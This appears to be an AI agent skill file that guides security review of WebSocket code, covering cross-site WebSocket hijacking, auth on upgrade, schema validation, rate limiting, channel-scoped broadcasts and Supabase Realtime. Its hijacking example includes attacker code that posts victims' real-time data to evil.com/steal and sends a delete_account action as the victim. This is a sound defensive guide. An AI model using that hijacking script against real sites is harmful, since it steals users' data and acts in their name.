---
name: websocket-security
description: Security review for WebSocket implementations — Supabase Realtime, OpenClaw gateway, Socket.IO, and custom WebSocket endpoints. Use when reviewing WebSocket connection handling, authentication on WS connections, origin validation, message validation, broadcast security, and any real-time communication feature. Covers Cross-Site WebSocket Hijacking (CSWSH), missing origin validation, authentication bypass on WS upgrade, message injection, DoS via message flooding, and the ClawJacked vulnerability (OpenClaw WebSocket hijack).
---

# WebSocket Security

## Why WebSockets Are a Unique Attack Surface

WebSockets bypass many browser security mechanisms:
- **No CORS enforcement** — browsers don't block cross-origin WebSocket connections
- **Cookies sent automatically** — including auth cookies (enables CSWSH)
- **Persistent connection** — one compromised connection = ongoing access
- **Bidirectional** — attacker can send AND receive
- **No preflight** — no OPTIONS request, connection established immediately

**Our exposure**: Supabase Realtime (WebSocket), OpenClaw Gateway (WebSocket), any Socket.IO usage.

## Attack 1: Cross-Site WebSocket Hijacking (CSWSH)

### The Attack
A malicious website opens a WebSocket to YOUR server. The browser automatically sends the victim's cookies with the connection. If the server doesn't validate the Origin header, the attacker's site gets a fully authenticated WebSocket connection.

```javascript
// On attacker's site (evil.com)
const ws = new WebSocket('wss://your-app.com/realtime')
// Browser sends victim's session cookies with this connection!
// If server doesn't check Origin, attacker has authenticated access

ws.onmessage = (event) => {
  // Attacker receives all real-time data meant for the victim
  fetch('https://evil.com/steal', { method: 'POST', body: event.data })
}

ws.onopen = () => {
  // Attacker can send messages as the victim
  ws.send(JSON.stringify({ action: 'delete_account' }))
}
```

### The Fix: Origin Validation
```typescript
import { WebSocketServer } from 'ws'

const wss = new WebSocketServer({ noServer: true })

server.on('upgrade', (request, socket, head) => {
  const origin = request.headers.origin
  
  // Strict origin allowlist
  const ALLOWED_ORIGINS = new Set([
    'https://your-app.com',
    'https://www.your-app.com',
  ])
  
  if (!origin || !ALLOWED_ORIGINS.has(origin)) {
    socket.write('HTTP/1.1 403 Forbidden\r\n\r\n')
    socket.destroy()
    return
  }
  
  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit('connection', ws, request)
  })
})
```

### Detection in Code Review
- [ ] Is Origin header validated on WebSocket upgrade?
- [ ] Is the validation a strict allowlist (not regex, not substring)?
- [ ] Is `null` origin rejected?
- [ ] For Supabase Realtime: is it configured with proper anon key scoping?

## Attack 2: Authentication Bypass on Upgrade

### The Problem
WebSocket authentication often happens at connection time, then is never re-verified. If the auth check is missing or weak:

```typescript
// VULNERABLE — no auth on WebSocket connection
wss.on('connection', (ws, request) => {
  // No auth check — anyone can connect
  ws.on('message', (data) => {
    // Process messages from unauthenticated connection
  })
})

// ALSO VULNERABLE — auth check that can be replayed
wss.on('connection', (ws, request) => {
  const token = new URL(request.url, 'http://localhost').searchParams.get('token')
  // Token in URL = logged in server logs, browser history, referrer headers
})
```

### The Fix: Token-Based Auth with Verification
```typescript
wss.on('connection', async (ws, request) => {
  // Extract token from first message or header (NOT URL)
  const protocol = request.headers['sec-websocket-protocol']
  // Or wait for auth message:
  
  ws.once('message', async (data) => {
    const { token } = JSON.parse(data.toString())
    
    // Verify token against auth server
    const user = await verifyToken(token)
    if (!user) {
      ws.close(4001, 'Unauthorized')
      return
    }
    
    // Store user context on the connection
    (ws as any).userId = user.id
    
    // Now handle messages with auth context
    ws.on('message', (msg) => handleMessage(ws, msg, user))
  })
  
  // Timeout: if no auth within 5 seconds, disconnect
  setTimeout(() => {
    if (!(ws as any).userId) {
      ws.close(4001, 'Auth timeout')
    }
  }, 5000)
})
```

## Attack 3: Message Injection / Validation

### The Problem
WebSocket messages are arbitrary data. Without validation, attackers can:
- Send malformed messages that crash the server
- Inject data that other clients receive and render unsafely
- Trigger unintended server-side operations

```typescript
// VULNERABLE — no message validation
ws.on('message', (data) => {
  const msg = JSON.parse(data.toString())  // Can crash on invalid JSON
  broadcast(msg)  // Broadcasts unvalidated data to all clients
  db.insert(msg)  // Inserts unvalidated data into database
})
```

### The Fix: Schema Validation on Every Message
```typescript
import { z } from 'zod'

const MessageSchema = z.discriminatedUnion('type', [
  z.object({ type: z.literal('chat'), content: z.string().max(5000).trim(), channelId: z.string().uuid() }),
  z.object({ type: z.literal('typing'), channelId: z.string().uuid() }),
  z.object({ type: z.literal('ping') }),
])

ws.on('message', (raw) => {
  let data: unknown
  try {
    data = JSON.parse(raw.toString())
  } catch {
    ws.send(JSON.stringify({ error: 'Invalid JSON' }))
    return
  }
  
  const msg = MessageSchema.safeParse(data)
  if (!msg.success) {
    ws.send(JSON.stringify({ error: 'Invalid message' }))
    return
  }
  
  // msg.data is now typed and validated
  handleValidatedMessage(ws, msg.data)
})
```

## Attack 4: DoS via Message Flooding

### The Problem
An attacker opens a WebSocket and sends messages as fast as possible, overwhelming the server.

### The Fix: Per-Connection Rate Limiting
```typescript
const connectionLimits = new WeakMap<WebSocket, { count: number; resetAt: number }>()

function checkMessageRate(ws: WebSocket): boolean {
  const now = Date.now()
  let limit = connectionLimits.get(ws)
  
  if (!limit || now >= limit.resetAt) {
    limit = { count: 0, resetAt: now + 1000 }  // 1-second window
    connectionLimits.set(ws, limit)
  }
  
  limit.count++
  if (limit.count > 50) {  // 50 messages per second max
    return false
  }
  return true
}

ws.on('message', (data) => {
  if (!checkMessageRate(ws)) {
    ws.send(JSON.stringify({ error: 'Rate limited' }))
    return
  }
  // Process message
})
```

### Message Size Limiting
```typescript
const wss = new WebSocketServer({
  maxPayload: 64 * 1024,  // 64KB max message size
})

// Also limit total connections per IP
const connectionsByIP = new Map<string, number>()
const MAX_CONNECTIONS_PER_IP = 10

server.on('upgrade', (request, socket, head) => {
  const ip = request.headers['x-forwarded-for']?.split(',')[0] || request.socket.remoteAddress || ''
  const count = connectionsByIP.get(ip) || 0
  
  if (count >= MAX_CONNECTIONS_PER_IP) {
    socket.write('HTTP/1.1 429 Too Many Requests\r\n\r\n')
    socket.destroy()
    return
  }
  
  connectionsByIP.set(ip, count + 1)
  // Decrement on close
})
```

## Attack 5: Broadcast Authorization

### The Problem
WebSocket broadcasts can leak data to unauthorized clients if channel/room authorization isn't enforced.

```typescript
// VULNERABLE — broadcast to all connected clients
function broadcast(message: any) {
  wss.clients.forEach(client => {
    client.send(JSON.stringify(message))  // EVERY client gets this, including unauthorized
  })
}
```

### The Fix: Channel-Scoped Broadcasts with Authorization
```typescript
const channels = new Map<string, Set<WebSocket>>()

function subscribe(ws: WebSocket, channelId: string, userId: string) {
  // Verify user has access to this channel
  const hasAccess = await checkChannelAccess(userId, channelId)
  if (!hasAccess) {
    ws.send(JSON.stringify({ error: 'Forbidden' }))
    return
  }
  
  if (!channels.has(channelId)) channels.set(channelId, new Set())
  channels.get(channelId)!.add(ws)
}

function broadcastToChannel(channelId: string, message: any, excludeWs?: WebSocket) {
  const subscribers = channels.get(channelId)
  if (!subscribers) return
  
  const payload = JSON.stringify(message)
  for (const ws of subscribers) {
    if (ws !== excludeWs && ws.readyState === WebSocket.OPEN) {
      ws.send(payload)
    }
  }
}
```

## Supabase Realtime Security

### How Supabase Realtime Works
Supabase Realtime uses WebSockets with **RLS enforcement**:
- Subscriptions respect RLS policies
- Users only receive changes to rows they can `SELECT`
- Auth token passed during subscription

### What to Verify
- [ ] RLS policies on subscribed tables are correct (see `rls-bypass-testing`)
- [ ] Broadcast channels use proper authorization
- [ ] Presence channels don't leak sensitive user data
- [ ] Realtime subscriptions filtered to necessary tables/columns only

### Common Supabase Realtime Mistakes
```typescript
// DANGEROUS — subscribing to all changes on a table
supabase.channel('all-changes')
  .on('postgres_changes', { event: '*', schema: 'public', table: 'messages' }, handleChange)
  .subscribe()
// If RLS is wrong, this receives ALL messages from ALL users

// BETTER — subscribe with filter
supabase.channel('my-messages')
  .on('postgres_changes', {
    event: '*',
    schema: 'public',
    table: 'messages',
    filter: `channel_id=eq.${channelId}`
  }, handleChange)
  .subscribe()
```

## OpenClaw WebSocket (ClawJacked Reference)

The ClawJacked vulnerability exploited OpenClaw's WebSocket gateway:
1. No rate limiting on localhost connections
2. Auto-approval of localhost device registration
3. WebSocket accessible from any website via JavaScript

**Lessons applied to any WebSocket endpoint**:
- [ ] Rate limit authentication attempts (even from localhost)
- [ ] Require explicit user approval for new device connections
- [ ] Validate Origin header (even on localhost)
- [ ] Log and alert on brute-force connection attempts

## Review Checklist

- [ ] Origin header validated with strict allowlist on upgrade
- [ ] Authentication required and verified before processing messages
- [ ] Auth tokens NOT passed in URL (use header or first message)
- [ ] Every message validated with schema before processing
- [ ] Per-connection rate limiting implemented
- [ ] Max message size enforced
- [ ] Max connections per IP enforced
- [ ] Broadcast only to authorized channel subscribers
- [ ] Connection cleanup on close (remove from channels, decrement counters)
- [ ] Supabase Realtime subscriptions rely on correct RLS
- [ ] No sensitive data exposed in WebSocket error messages

## References

For CORS-related concerns, see `cors-and-csp-hardening` skill.
For Supabase RLS that Realtime depends on, see `rls-bypass-testing` skill.
